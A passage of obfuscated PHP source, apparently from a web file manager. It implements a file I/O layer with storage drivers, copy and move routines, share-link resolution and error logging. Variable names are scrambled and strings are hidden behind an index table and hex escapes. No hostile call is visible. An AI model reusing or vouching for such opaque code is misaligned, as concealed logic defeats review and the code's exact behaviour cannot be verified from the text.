$Ü®í•çÃ = $ºÇõ±¸Ï[473] . trim($Ü®í•çÃ, $ºÇõ±¸Ï[473]) . $ºÇõ±¸Ï[473]; } return $Ü®í•çÃ; } } goto Cãªê®ÛáÑ; d•íì¨Àã‘: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ã–¨È¯, $¹½§Ùª) { $Í¯Ò´ö‰ =& $_SERVER[åÄ¼Ùßš]; $ãüğ¥‰» = $¹½§Ùª; $GLOBALS[$Í¯Ò´ö‰[1262]] = $Í¯Ò´ö‰[1263] . $ã–¨È¯; Hook::trigger($Í¯Ò´ö‰[1263] . $ã–¨È¯ . $Í¯Ò´ö‰[1264], $ãüğ¥‰»); $™³€¦Ï™ = self::driverMake($¹½§Ùª[0]); if (!$™³€¦Ï™) { return !1; } if ($ã–¨È¯ == $Í¯Ò´ö‰[634] || $ã–¨È¯ == $Í¯Ò´ö‰[636] || $ã–¨È¯ == $Í¯Ò´ö‰[1265]) { if (!trim($™³€¦Ï™->path . $Í¯Ò´ö‰[464], $Í¯Ò´ö‰[8])) { return !1; } } if (method_exists($™³€¦Ï™, $ã–¨È¯)) { $İç´Ãí­ = @call_user_func_array(array($™³€¦Ï™, $ã–¨È¯), $¹½§Ùª); } else { if (method_exists($™³€¦Ï™, $Í¯Ò´ö‰[1266])) { $İç´Ãí­ = @call_user_func_array(array($™³€¦Ï™, $ã–¨È¯), $¹½§Ùª); } else { if (method_exists(self, $ã–¨È¯)) { $İç´Ãí­ = @call_user_func_array(array(self, $ã–¨È¯), $¹½§Ùª); } else { $İç´Ãí­ = call_user_func_array(array(parent, $ã–¨È¯), $¹½§Ùª); } } } Hook::trigger($Í¯Ò´ö‰[1263] . $ã–¨È¯ . $Í¯Ò´ö‰[1267], $ãüğ¥‰», $İç´Ãí­); return $İç´Ãí­; } public static function init($Ôó˜É) { return self::driverMake($Ôó˜É); } public static function copy($¡à•ì“‘, $çì¦ÇÚİ, $ëŒ–ù² = false, $ò‡š¥¨× = false) { return self::copyMoveStart($¡à•ì“‘, $çì¦ÇÚİ, $ëŒ–ù², $_SERVER[åÄ¼Ùßš][634], $ò‡š¥¨×); } public static function move($¦€Çå€, $†›«•·Ë, $‘½Ô¡–¥ = false, $ ãóâá = false) { return self::copyMoveStart($¦€Çå€, $†›«•·Ë, $‘½Ô¡–¥, $_SERVER[åÄ¼Ùßš][636], $ ãóâá); } public static function copyMoveChildren($¯ŠÙ”Ôø, $ºğĞÊø³, $ú€š = "\x63\157\160\x79", $ß÷îÖ£… = REPEAT_REPLACE) { $Êö®­—µ =& $_SERVER[åÄ¼Ùßš]; $ñ–ü•°– = $¯ŠÙ”Ôø; $¼†×ê¿· = self::driverMake($¯ŠÙ”Ôø); $ÊßªÈ»Ë = $¼†×ê¿·->listPath($¯ŠÙ”Ôø, !0); $äÍòş¼§ = array_merge($ÊßªÈ»Ë[$Êö®­—µ[86]], $ÊßªÈ»Ë[$Êö®­—µ[85]]); foreach ($äÍòş¼§ as $ºå°ÇâÎ) { self::copyMoveStart($ºå°ÇâÎ[$Êö®­—µ[87]], $ºğĞÊø³, $ß÷îÖ£…, $ú€š, !1); } if ($ú€š == $Êö®­—µ[636]) { self::remove($ñ–ü•°–); } } private static function copyMoveStart($äØÕí , $ËÃ»ùÌ, $Ë•€Íñ, $ìâ·Âá, $’±á¹Å) { $×ı°÷õÏ =& $_SERVER[åÄ¼Ùßš]; $Şá±Ò×  = array($äØÕí , $ËÃ»ùÌ, $Ë•€Íñ, $’±á¹Å); Hook::trigger($×ı°÷õÏ[1263] . $ìâ·Âá . $×ı°÷õÏ[1264], $Şá±Ò× ); $”­ƒ¤²± = self::copyMove($äØÕí , $ËÃ»ùÌ, $Ë•€Íñ, $ìâ·Âá, $’±á¹Å); Hook::trigger($×ı°÷õÏ[1263] . $ìâ·Âá . $×ı°÷õÏ[1267], $Şá±Ò× , $”­ƒ¤²±); return $”­ƒ¤²±; } public static function saveFile($†é…Îª, $ñ¬Ê¸, $¡û–‡Š¿ = true) { $“ÎÅåèï =& $_SERVER[åÄ¼Ùßš]; $¨ƒÕŒ  = self::info($ñ¬Ê¸); $ìÜ•Õ = self::driverMake($†é…Îª); $›“µ ƒ¢ = self::driverMake($ñ¬Ê¸); $ØÛ¨úÜİ = !1; if ($›“µ ƒ¢->pathParse[$“ÎÅåèï[1268]]) { $ØÛ¨úÜİ = $›“µ ƒ¢; $Â¡ÙµöØ = $›“µ ƒ¢->pathParse[$“ÎÅåèï[1268]]; $›“µ ƒ¢ = self::driverMake($Â¡ÙµöØ); } if ($ìÜ•Õ->pathParse[$“ÎÅåèï[1268]]) { $ôÖ•¥ñ = $ìÜ•Õ->pathParse[$“ÎÅåèï[1268]]; $ìÜ•Õ = self::driverMake($ôÖ•¥ñ); } $ğş³™ñ = $›“µ ƒ¢->pathFather($ñ¬Ê¸); $¹èàöÎ = !0; if (!$¡û–‡Š¿ && self::driverIsSame($ìÜ•Õ, $›“µ ƒ¢)) { $¹èàöÎ = !1; } $‘ËĞáŞÖ = self::copyFile($ìÜ•Õ, $†é…Îª, $›“µ ƒ¢, $ğş³™ñ, $¨ƒÕŒ [$“ÎÅåèï[32]], $¹èàöÎ); if ($ØÛ¨úÜİ) { $‘ËĞáŞÖ = $ØÛ¨úÜİ->getPathOuter($‘ËĞáŞÖ); } return $‘ËĞáŞÖ; } private static function copyMove($—µŸ‘†, $ŞÛÏèæ, $Ò ‚†, $·Ö¼‰Ùú, $ÁÛÇÎ˜ñ = false) { $úÇ–¥™ù =& $_SERVER[åÄ¼Ùßš]; if (!$—µŸ‘† || $—µŸ‘† == $úÇ–¥™ù[8] || !$ŞÛÏèæ) { return !1; } ignore_timeout(); $şåº†ğ˜ = self::driverMake($—µŸ‘†); $Ú‘¹ªÑ = self::driverMake($ŞÛÏèæ); $¦ÊğÖ¥à = $·Ö¼‰Ùú == $úÇ–¥™ù[636]; $¨ı³ãó­ = !1; if ($Ú‘¹ªÑ->pathParse[$úÇ–¥™ù[1268]]) { $¨ı³ãó­ = $Ú‘¹ªÑ; $ŞÛÏèæ = $Ú‘¹ªÑ->pathParse[$úÇ–¥™ù[1268]]; $Ú‘¹ªÑ = self::driverMake($ŞÛÏèæ); } if ($şåº†ğ˜->pathParse[$úÇ–¥™ù[1268]]) { $—µŸ‘† = $şåº†ğ˜->pathParse[$úÇ–¥™ù[1268]]; $şåº†ğ˜ = self::driverMake($—µŸ‘†); } self::check($şåº†ğ˜, $—µŸ‘†, $Ú‘¹ªÑ, $ŞÛÏèæ); Hook::trigger($úÇ–¥™ù[1269], $şåº†ğ˜, $—µŸ‘†, $Ú‘¹ªÑ, $ŞÛÏèæ); $™ô±ËÖ = self::driverIsSame($şåº†ğ˜, $Ú‘¹ªÑ); if ($™ô±ËÖ) { if ($·Ö¼‰Ùú == $úÇ–¥™ù[636] && !method_exists($Ú‘¹ªÑ, $úÇ–¥™ù[1270]) && trim($ŞÛÏèæ, $úÇ–¥™ù[8]) == trim($Ú‘¹ªÑ->pathFather($—µŸ‘†), $úÇ–¥™ù[8])) { if ($şåº†ğ˜->pathThis($—µŸ‘†) != $ÁÛÇÎ˜ñ && !$şåº†ğ˜->isOsDriver()) { return $şåº†ğ˜->rename($—µŸ‘†, $ÁÛÇÎ˜ñ); } return $Ú‘¹ªÑ->getPathOuter($—µŸ‘†); } if (method_exists($Ú‘¹ªÑ, $·Ö¼‰Ùú)) { return $Ú‘¹ªÑ->{$·Ö¼‰Ùú}($—µŸ‘†, $ŞÛÏèæ, $Ò ‚†, $ÁÛÇÎ˜ñ); } } if ($™ô±ËÖ && $·Ö¼‰Ùú == $úÇ–¥™ù[636] && $Ú‘¹ªÑ->getType() == $úÇ–¥™ù[109]) { $İŒø†Åº = $Ú‘¹ªÑ->movePath($—µŸ‘†, $ŞÛÏèæ, $ÁÛÇÎ˜ñ); if ($İŒø†Åº) { return $İŒø†Åº; } } $‘êùØŠø = $şåº†ğ˜->isFile($—µŸ‘†); if (!$‘êùØŠø && $Ú‘¹ªÑ->getType() == $úÇ–¥™ù[851] && $şåº†ğ˜->getType() == $úÇ–¥™ù[109]) { $İŒø†Åº = $Ú‘¹ªÑ->copyFolderFromIO($şåº†ğ˜, $—µŸ‘†, $ŞÛÏèæ, $Ò ‚†, $¦ÊğÖ¥à, $ÁÛÇÎ˜ñ); } else { $İŒø†Åº = self::copyPath($şåº†ğ˜, $—µŸ‘†, $Ú‘¹ªÑ, $ŞÛÏèæ, $Ò ‚†, $¦ÊğÖ¥à, $‘êùØŠø, $ÁÛÇÎ˜ñ); } if ($İŒø†Åº && $¦ÊğÖ¥à) { $şåº†ğ˜->remove($—µŸ‘†); } if ($¨ı³ãó­) { $İŒø†Åº = $¨ı³ãó­->getPathOuter($İŒø†Åº); } return $İŒø†Åº; } private static function check($¤Ú¡ÌÈ…, $‡†Üó·×, $Ç¯äÚîÙ, &$‚ìÌ€‡ù) { $¥úªúşı =& $_SERVER[åÄ¼Ùßš]; if (self::driverIsSame($¤Ú¡ÌÈ…, $Ç¯äÚîÙ) && $¤Ú¡ÌÈ…->isFolder($‡†Üó·×) && $¤Ú¡ÌÈ…->isParentOf($‡†Üó·×, $‚ìÌ€‡ù)) { show_json(LNG($¥úªúşı[1271]), !1); } if (!$¤Ú¡ÌÈ…->exist($‡†Üó·×)) { show_json(LNG($¥úªúşı[108]), !1); } } private static function copyPath($šÈÏ°¿¢, $õë¶³êº, $È‹„¡œ¿, $³¯¸¸Ÿæ, $÷ñˆçÃ×, $ÛÌ¨òÇ“, $ò€ŸøÆÒ, $Ñùãâ = false, $­ÁæÔ¸— = true) { $º†’¯Ùš =& $_SERVER[åÄ¼Ùßš]; $û®é²õÃ = empty($Ñùãâ) && $Ñùãâ !== $º†’¯Ùš[231] ? $šÈÏ°¿¢->pathThis($õë¶³êº) : $Ñùãâ; if ($÷ñˆçÃ×) { $íë”’Ç– = $È‹„¡œ¿->fileNameExist($³¯¸¸Ÿæ, $û®é²õÃ); $·¥á«ı¼ = $û®é²õÃ; $û®é²õÃ = $È‹„¡œ¿->fileNameAuto($³¯¸¸Ÿæ, $û®é²õÃ, $÷ñˆçÃ×, !$ò€ŸøÆÒ); if (!$íë”’Ç– || $·¥á«ı¼ != $û®é²õÃ) { $÷ñˆçÃ× = !1; } if ($­ÁæÔ¸— && !$÷ñˆçÃ×) { $È‹„¡œ¿->_data[$º†’¯Ùš[1272]] = !0; } } if ($ò€ŸøÆÒ) { return self::copyFile($šÈÏ°¿¢, $õë¶³êº, $È‹„¡œ¿, $³¯¸¸Ÿæ, $û®é²õÃ, $ÛÌ¨òÇ“); } if ($÷ñˆçÃ× == REPEAT_RENAME_FOLDER) { $÷ñˆçÃ× = !1; } $õ±¢ÛÑ‡ = rtrim($³¯¸¸Ÿæ, $º†’¯Ùš[8]) . $º†’¯Ùš[8] . $û®é²õÃ; $§ÎÒ‰ºÎ = $È‹„¡œ¿->mkdir($È‹„¡œ¿->getPath($õ±¢ÛÑ‡), $÷ñˆçÃ×); $³¯¸¸Ÿæ = $È‹„¡œ¿->getPathInner($§ÎÒ‰ºÎ); $œÓ«Ø™Ü = $šÈÏ°¿¢->listPath($õë¶³êº, !0); $œÓ«Ø™Ü = is_array($œÓ«Ø™Ü) ? $œÓ«Ø™Ü : array($º†’¯Ùš[86] => array(), $º†’¯Ùš[85] => array()); $¹âÒÀëÏ = array_merge($œÓ«Ø™Ü[$º†’¯Ùš[86]], $œÓ«Ø™Ü[$º†’¯Ùš[85]]); foreach ($¹âÒÀëÏ as $‚Õ±Æ°¿) { $ù³²™Ö = $‚Õ±Æ°¿[$º†’¯Ùš[33]] == $º†’¯Ùš[233]; $õë¶³êº = $šÈÏ°¿¢->getPathInner($‚Õ±Æ°¿[$º†’¯Ùš[87]]); $äÕù ıš = self::copyPath($šÈÏ°¿¢, $õë¶³êº, $È‹„¡œ¿, $³¯¸¸Ÿæ, $÷ñˆçÃ×, $ÛÌ¨òÇ“, $ù³²™Ö, !1, !1); if (!$äÕù ıš) { IO::errorTips($º†’¯Ùš[1273] . $õë¶³êº . $º†’¯Ùš[73] . $³¯¸¸Ÿæ); } } self::copyMoveKeepInfo($šÈÏ°¿¢, $õë¶³êº, $§ÎÒ‰ºÎ); return $§ÎÒ‰ºÎ; } private static function copyFile($Ş²½¯¹ñ, $äâ‹ãîŸ, $ğÒü£±è, $Æ…×ëÒˆ, $¿‚€Ê‡», $êûÑöÓı) { $–ı¡¾ì” =& $_SERVER[åÄ¼Ùßš]; $Æ…×ëÒˆ = $ğÒü£±è->getPath(rtrim($Æ…×ëÒˆ, $–ı¡¾ì”[8]) . $–ı¡¾ì”[8] . $¿‚€Ê‡»); $å­ã¾ÖÀ = $–ı¡¾ì”[1274] . time() . rand_string(5); Hook::trigger($–ı¡¾ì”[1275], $Ş²½¯¹ñ, $äâ‹ãîŸ, $ğÒü£±è, $Æ…×ëÒˆ, $¿‚€Ê‡», $å­ã¾ÖÀ); if (self::driverIsSame($Ş²½¯¹ñ, $ğÒü£±è)) { if ($êûÑöÓı) { $¯¨áıÔ® = $ğÒü£±è->moveFile($äâ‹ãîŸ, $Æ…×ëÒˆ); } else { $¯¨áıÔ® = $ğÒü£±è->copyFile($äâ‹ãîŸ, $Æ…×ëÒˆ); } Hook::trigger($–ı¡¾ì”[1276], $Ş²½¯¹ñ, $äâ‹ãîŸ, $ğÒü£±è, $Æ…×ëÒˆ, $¿‚€Ê‡», $¯¨áıÔ®); self::copyMoveKeepInfo($Ş²½¯¹ñ, $äâ‹ãîŸ, $¯¨áıÔ®); return $¯¨áıÔ®; } $·…ü•ÇÃ = TEMP_FILES; if ($GLOBALS[$–ı¡¾ì”[6]][$–ı¡¾ì”[92]][$–ı¡¾ì”[894]]) { $·…ü•ÇÃ = $GLOBALS[$–ı¡¾ì”[6]][$–ı¡¾ì”[92]][$–ı¡¾ì”[894]]; } $Åò’ÚŸº = $·…ü•ÇÃ; mk_dir($Åò’ÚŸº); $¯Ş™Å¡ = $Åò’ÚŸº . $å­ã¾ÖÀ; $É§œú‚ = $¯Ş™Å¡; $¯Ş™Å¡ = $Ş²½¯¹ñ->download($äâ‹ãîŸ, $¯Ş™Å¡); $¯Ş™Å¡ = $Ş²½¯¹ñ->iconvApp($¯Ş™Å¡); if (substr($¯Ş™Å¡, strlen($·…ü•ÇÃ)) == $·…ü•ÇÃ) { $êûÑöÓı = !0; } $¯¨áıÔ® = $ğÒü£±è->upload($Æ…×ëÒˆ, $¯Ş™Å¡, $êûÑöÓı); self::remove($É§œú‚); Hook::trigger($–ı¡¾ì”[1276], $Ş²½¯¹ñ, $äâ‹ãîŸ, $ğÒü£±è, $Æ…×ëÒˆ, $¿‚€Ê‡», $¯¨áıÔ®); self::copyMoveKeepInfo($Ş²½¯¹ñ, $äâ‹ãîŸ, $¯¨áıÔ®); return $¯¨áıÔ®; } private static function copyMoveKeepInfo($òíÑÉ÷», $ûÜŒŞ“¾, $ûÑ¹•¬·) { if (!$ûÑ¹•¬·) { return; } $¾„†îò× = $òíÑÉ÷»->info($ûÜŒŞ“¾); if (!is_array($¾„†îò×)) { return; } IO::setModifyTime($ûÑ¹•¬·, $¾„†îò×[$_SERVER[åÄ¼Ùßš][88]]); } public static function pathFather($Ô¾¸Ò‚¹) { $î¾ê´±Ï = IO::init($Ô¾¸Ò‚¹); $öÙ˜ÙÁ = $î¾ê´±Ï->pathFather($î¾ê´±Ï->path); return $î¾ê´±Ï->getPathOuter($öÙ˜ÙÁ); } public static function fileOut($£–¹Š‰, $ª±’åäø = false, $€Æò„Ä = false, $Óèˆ— = '') { $”ÙÕÉ˜ø = self::driverMake($£–¹Š‰); if ($”ÙÕÉ˜ø->isFileOutServer()) { return $”ÙÕÉ˜ø->fileOutServer($£–¹Š‰, $ª±’åäø, $€Æò„Ä, $Óèˆ—); } return $”ÙÕÉ˜ø->fileOut($£–¹Š‰, $ª±’åäø, $€Æò„Ä, $Óèˆ—); } public static function fileOutImage($ßŞùÂÕ, $ØÓÎàÏÌ = 250) { $ŠÅñ‡å = array(250, 600, 1200, 2000, 3000, 5000); for ($€Ûê—“Ú = 0; $€Ûê—“Ú < count($ŠÅñ‡å); $€Ûê—“Ú++) { if ($€Ûê—“Ú == 0 && $ØÓÎàÏÌ <= $ŠÅñ‡å[$€Ûê—“Ú]) { $ØÓÎàÏÌ = $ŠÅñ‡å[$€Ûê—“Ú]; break; } else { if ($ØÓÎàÏÌ > $ŠÅñ‡å[$€Ûê—“Ú - 1] && $ØÓÎàÏÌ <= $ŠÅñ‡å[$€Ûê—“Ú]) { $ØÓÎàÏÌ = $ŠÅñ‡å[$€Ûê—“Ú]; break; } else { if ($€Ûê—“Ú == count($ŠÅñ‡å) - 1 && $ØÓÎàÏÌ > $ŠÅñ‡å[$€Ûê—“Ú]) { $ØÓÎàÏÌ = $ŠÅñ‡å[$€Ûê—“Ú]; break; } } } } $ÉÄÜ«Ÿ = self::driverMake($ßŞùÂÕ); if ($ÉÄÜ«Ÿ->isFileOutServer()) { return $ÉÄÜ«Ÿ->fileOutImageServer($ßŞùÂÕ, $ØÓÎàÏÌ); } return $ÉÄÜ«Ÿ->fileOutImage($ßŞùÂÕ, $ØÓÎàÏÌ); } private static function driverIsSame($»Ü¢‹Öî, $…Ö¢ª¢ê) { $ºÎºè„ =& $_SERVER[åÄ¼Ùßš]; $Ì¥¼“­º = $»Ü¢‹Öî->getType(); $³À±°Úû = $…Ö¢ª¢ê->getType(); if ($Ì¥¼“­º != $³À±°Úû) { return !1; } if ($Ì¥¼“­º == $ºÎºè„[851]) { return !0; } if ($Ì¥¼“­º == $ºÎºè„[109]) { return !0; } if ($»Ü¢‹Öî->pathDriver == $…Ö¢ª¢ê->pathDriver) { return !0; } return !1; } public static function copyUpdate($ò×àáûâ, $Éİªè¢È) { $­ø¿ÊŒ² =& $_SERVER[åÄ¼Ùßš]; if (!IO::exist($ò×àáûâ)) { return !1; } if (!IO::exist($Éİªè¢È)) { IO::mkdir($Éİªè¢È); } $ª–Ä¢À = array_to_keyvalue(self::listAllSimple($ò×àáûâ), $­ø¿ÊŒ²[87]); $º·éá˜› = array_to_keyvalue(self::listAllSimple($Éİªè¢È), $­ø¿ÊŒ²[87]); $œµÕè‡Š = array(); $ÆÜ‘Ç½Ø = array(); foreach ($ª–Ä¢À as $Ä˜Øª¥¢ => $Ÿóü) { if (isset($º·éá˜›[$Ä˜Øª¥¢])) { if ($Ÿóü[$­ø¿ÊŒ²[78]] == 1) { continue; } if ($º·éá˜›[$Ä˜Øª¥¢][$­ø¿ÊŒ²[79]] == $Ÿóü[$­ø¿ÊŒ²[79]]) { continue; } } if ($Ÿóü[$­ø¿ÊŒ²[78]] == 1) { $ÆÜ‘Ç½Ø[] = $Éİªè¢È . $­ø¿ÊŒ²[8] . trim($Ä˜Øª¥¢, $­ø¿ÊŒ²[8]); continue; } $“ü¯Æ—– = strstr(trim($Ä˜Øª¥¢, $­ø¿ÊŒ²[8]), $­ø¿ÊŒ²[8]) ? get_path_father($Ä˜Øª¥¢) : $­ø¿ÊŒ²[12]; $œµÕè‡Š[] = array($­ø¿ÊŒ²[1277] => $Ÿóü[$­ø¿ÊŒ²[89]], $­ø¿ÊŒ²[1278] => rtrim($Éİªè¢È, $­ø¿ÊŒ²[8]) . $­ø¿ÊŒ²[8] . $“ü¯Æ—–, $­ø¿ÊŒ²[1279] => $Ÿóü); } $ô·ª›šš = array($­ø¿ÊŒ²[233] => $œµÕè‡Š, $­ø¿ÊŒ²[78] => $ÆÜ‘Ç½Ø); Hook::trigger($­ø¿ÊŒ²[1280], $ò×àáûâ, $Éİªè¢È, $ô·ª›šš); foreach ($ÆÜ‘Ç½Ø as $Ÿóü) { IO::mkdir($Ÿóü); } foreach ($œµÕè‡Š as $Ÿóü) { IO::copy($Ÿóü[$­ø¿ÊŒ²[1277]], $Ÿóü[$­ø¿ÊŒ²[1278]], REPEAT_REPLACE); } } public static function fileSubstr($‰¤ÔÁö, $ª×©, $½©Ò³ˆ = false) { $™ø‘³‹¯ =& $_SERVER[åÄ¼Ùßš]; $ıòêêìÄ = self::driverMake($‰¤ÔÁö); $‚ÛÄáß÷ = $ıòêêìÄ->size($‰¤ÔÁö); $°ÃæáŸé = $ª×©; $åÄ‰Ê¢Œ = $½©Ò³ˆ; if ($ª×© < 0) { $ª×© = $‚ÛÄáß÷ + $ª×©; } if ($½©Ò³ˆ === !1) { $½©Ò³ˆ = $‚ÛÄáß÷ - $ª×©; } if ($ª×© + $½©Ò³ˆ > $‚ÛÄáß÷) { $½©Ò³ˆ = $‚ÛÄáß÷ - $ª×©; } if (!$‚ÛÄáß÷ && $ıòêêìÄ->getType() == $™ø‘³‹¯[109] && !$ıòêêìÄ->exist($‰¤ÔÁö)) { $²Œø“â = get_path_this($‰¤ÔÁö); $åé´¬ç† = parse_url_query($²Œø“â); if (is_array($åé´¬ç†) && isset($åé´¬ç†[$™ø‘³‹¯[32]])) { $²Œø“â = urldecode($åé´¬ç†[$™ø‘³‹¯[32]]); } throw new Exception($™ø‘³‹¯[1281] . LNG($™ø‘³‹¯[1282]) . $™ø‘³‹¯[1074] . clear_html($²Œø“â) . $™ø‘³‹¯[12]); } if ($½©Ò³ˆ <= 0) { return $™ø‘³‹¯[12]; } if ($ª×© < 0 || $ª×© >= $‚ÛÄáß÷ || $½©Ò³ˆ > $GLOBALS[$™ø‘³‹¯[6]][$™ø‘³‹¯[92]][$™ø‘³‹¯[1283]]) { throw new Exception("\x66\151\154\x65\122\x65\x61\144\40\x65\x72\x72\157\x72\54\157\x76\145\x72\40\x69\157\x52\x65\141\144\115\x61\170\41\40\x73\x74\x61\162\164\75{$ª×©}\x3b\x6c\x65\x6e\147\164\150\x3d{$½©Ò³ˆ}\73\x20\163\151\172\145\75{$‚ÛÄáß÷}\73"); } $ŞÕÀ©… = $ıòêêìÄ->fileSubstr($‰¤ÔÁö, $ª×©, $½©Ò³ˆ); if (!$ŞÕÀ©… && $½©Ò³ˆ && isset($GLOBALS[$™ø‘³‹¯[1284]])) { throw new Exception($GLOBALS[$™ø‘³‹¯[1284]][$™ø‘³‹¯[1285]]); } return $ŞÕÀ©…; } private static function driverMake(&$ƒÔ„’ù) { $á±ãüšê =& $_SERVER[åÄ¼Ùßš]; $‹ÓÒ¡é³ = KodIO::parse($ƒÔ„’ù); if (!self::$driverListSystem) { $—îŒ˜øÓ = Model($á±ãüšê[861])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($—îŒ˜øÓ, $á±ãüšê[484]); } if ($‹ÓÒ¡é³[$á±ãüšê[33]] == KodIO::KOD_IO && !self::$driverListSystem[$‹ÓÒ¡é³[$á±ãüšê[484]]]) { throw new Exception($á±ãüšê[1286]); return !1; } $ƒÔ„’ù = $‹ÓÒ¡é³[$á±ãüšê[1287]]; $Ú»Êæ« = self::driverGet($‹ÓÒ¡é³, $ƒÔ„’ù); return $Ú»Êæ«; } private static function driverGet($˜ÇéÂã, &$ˆŞá‹º¬) { $óÓ«ª· =& $_SERVER[åÄ¼Ùßš]; $¾œîÙÈ’ = $˜ÇéÂã[$óÓ«ª·[1288]]; $±ŒÏ™áÏ = $˜ÇéÂã[$óÓ«ª·[484]]; switch ($˜ÇéÂã[$óÓ«ª·[33]]) { case KodIO::KOD_IO: $ğœ…“ø  = self::$driverListSystem[$±ŒÏ™áÏ]; break; case KodIO::KOD_SOURCE: $ˆŞá‹º¬ = $±ŒÏ™áÏ . $ˆŞá‹º¬; $ğœ…“ø  = array($óÓ«ª·[1289] => $óÓ«ª·[1290], $óÓ«ª·[6] => $˜ÇéÂã); $ğœ…“ø [$óÓ«ª·[6]][$óÓ«ª·[1291]] = $˜ÇéÂã[$óÓ«ª·[484]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‹²—ôæ = $GLOBALS[$óÓ«ª·[1292]]; self::$driverListUser = array_to_keyvalue($‹²—ôæ, $óÓ«ª·[484]); } $ğœ…“ø  = self::$driverListUser[$±ŒÏ™áÏ]; break; case KodIO::KOD_SHARE_LINK: $ğœ…“ø  = array($óÓ«ª·[1289] => $óÓ«ª·[1293], $óÓ«ª·[6] => $˜ÇéÂã); $¡ÕÈ©†é = Action($óÓ«ª·[1294])->sharePathInfo($˜ÇéÂã[$óÓ«ª·[87]]); $ˆŞá‹º¬ = $¡ÕÈ©†é[$óÓ«ª·[194]]; if (!$¡ÕÈ©†é[$óÓ«ª·[194]]) { $Ô·Ó›°œ = Model($óÓ«ª·[680])->getInfo($¡ÕÈ©†é[$óÓ«ª·[681]]); $ˆŞá‹º¬ = KodIO::clear($Ô·Ó›°œ[$óÓ«ª·[1295]] . $˜ÇéÂã[$óÓ«ª·[1287]]); $˜ÇéÂã[$óÓ«ª·[573]] = $Ô·Ó›°œ; $˜ÇéÂã[$óÓ«ª·[1268]] = $ˆŞá‹º¬; $ğœ…“ø  = array($óÓ«ª·[1289] => $óÓ«ª·[1296], $óÓ«ª·[6] => $˜ÇéÂã); } else { $ğœ…“ø [$óÓ«ª·[6]][$óÓ«ª·[1291]] = $¡ÕÈ©†é[$óÓ«ª·[194]]; } break; case KodIO::KOD_SHARE_ITEM: $ğœ…“ø  = array($óÓ«ª·[1289] => $óÓ«ª·[1297], $óÓ«ª·[6] => $˜ÇéÂã); $Ô·Ó›°œ = Model($óÓ«ª·[680])->getInfo($˜ÇéÂã[$óÓ«ª·[484]]); if ($Ô·Ó›°œ[$óÓ«ª·[194]] == $óÓ«ª·[231]) { $ˆŞá‹º¬ = KodIO::clear($Ô·Ó›°œ[$óÓ«ª·[1295]] . $˜ÇéÂã[$óÓ«ª·[1287]]); $˜ÇéÂã[$óÓ«ª·[573]] = $Ô·Ó›°œ; $˜ÇéÂã[$óÓ«ª·[1268]] = $ˆŞá‹º¬; $ğœ…“ø  = array($óÓ«ª·[1289] => $óÓ«ª·[1298], $óÓ«ª·[6] => $˜ÇéÂã); } else { if (!$ˆŞá‹º¬) { $ˆŞá‹º¬ = $Ô·Ó›°œ[$óÓ«ª·[194]]; } $ğœ…“ø [$óÓ«ª·[6]][$óÓ«ª·[1291]] = $Ô·Ó›°œ[$óÓ«ª·[194]]; } break; default: $ˆŞá‹º¬ = $˜ÇéÂã[$óÓ«ª·[87]]; $ğœ…“ø  = array($óÓ«ª·[1289] => $óÓ«ª·[1299]); break; } $çšÁÓ„© = $˜ÇéÂã[$óÓ«ª·[87]]; if (!isset(self::$driverCache[$çšÁÓ„©])) { $ÄëıÌó = strtolower($ğœ…“ø [$óÓ«ª·[98]]); $Ãá¦•åÊ = $GLOBALS[$óÓ«ª·[6]][$óÓ«ª·[92]][$óÓ«ª·[927]]; $·é‡¨Ÿß = $óÓ«ª·[77] . (isset($Ãá¦•åÊ[$ÄëıÌó]) ? $Ãá¦•åÊ[$ÄëıÌó] : ucfirst($ÄëıÌó)); if (!class_exists($·é‡¨Ÿß)) { show_json("{$·é‡¨Ÿß}\x20\x6e\157\164\40\x65\x78\x69\x73\x74\163\41", !1); } $‚²ŒËäı = isset($ğœ…“ø [$óÓ«ª·[6]]) ? $ğœ…“ø [$óÓ«ª·[6]] : !1; self::$driverCache[$çšÁÓ„©] = new $·é‡¨Ÿß($‚²ŒËäı); } $ïÅüæí = self::$driverCache[$çšÁÓ„©]; $ïÅüæí->pathDriver = $¾œîÙÈ’; $ïÅüæí->pathBase = $óÓ«ª·[12]; if (isset($ğœ…“ø [$óÓ«ª·[6]][$óÓ«ª·[1300]])) { $ïÅüæí->pathBase = rtrim($ğœ…“ø [$óÓ«ª·[6]][$óÓ«ª·[1300]], $óÓ«ª·[8]) . $óÓ«ª·[8]; $ˆŞá‹º¬ = $ïÅüæí->pathBase . ltrim($ˆŞá‹º¬, $óÓ«ª·[8]); } $ˆŞá‹º¬ = $ïÅüæí->getPath($ˆŞá‹º¬); if (isset($˜ÇéÂã[$óÓ«ª·[1268]])) { $ˆŞá‹º¬ = $˜ÇéÂã[$óÓ«ª·[1268]]; } $ïÅüæí->path = $ˆŞá‹º¬; return $ïÅüæí; } public static function errorTips($Úˆóà® = false) { $çğšäºš =& $_SERVER[åÄ¼Ùßš]; static $Àˆ»×… = array(); $÷‚¹ûÜâ = 1000; if ($Úˆóà® === -1) { return $Àˆ»×… ? $Àˆ»×…[count($Àˆ»×…) - 1] : $çğšäºš[12]; } if ($Úˆóà® === !1) { return implode($çğšäºš[288], $Àˆ»×…); } if (count($Àˆ»×…) >= $÷‚¹ûÜâ) { $Àˆ»×… = array_slice($Àˆ»×…, $÷‚¹ûÜâ * 0.5, $÷‚¹ûÜâ); } $Àˆ»×…[] = $Úˆóà®; write_log($çğšäºš[176] . ACTION . $çğšäºš[1301] . $Úˆóà®, $çğšäºš[1302]); } public static function getLastError($‰Şà½’® = '') { $ü³Ó¸¸– = self::errorTips(-1); return $ü³Ó¸¸– ? $ü³Ó¸¸– : $‰Şà½’®; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $êˆì˜¨ü; if ($êˆì˜¨ü) { return $êˆì˜¨ü; } $íÅ‰Â‚Ô = IO::init($_SERVER[åÄ¼Ùßš][8]); return $íÅ‰Â‚Ô; } private static function iconvSystem($¶’¸·˜İ) { return self::local()->iconvSystem($¶’¸·˜İ); } private static function iconvApp($Ö£äÈ‰´) { return self::local()->iconvApp($Ö£äÈ‰´); } public static function zipFolder($–ÂÕ›Ú, $àòºÛç = "\172\151\160", $—Ëá™æ  = '', $åîÜ´ñ« = REPEAT_RENAME) { $¡ùàğ®ß =& $_SERVER[åÄ¼Ùßš]; $ßßöãİÜ = IO::listPath($–ÂÕ›Ú); if 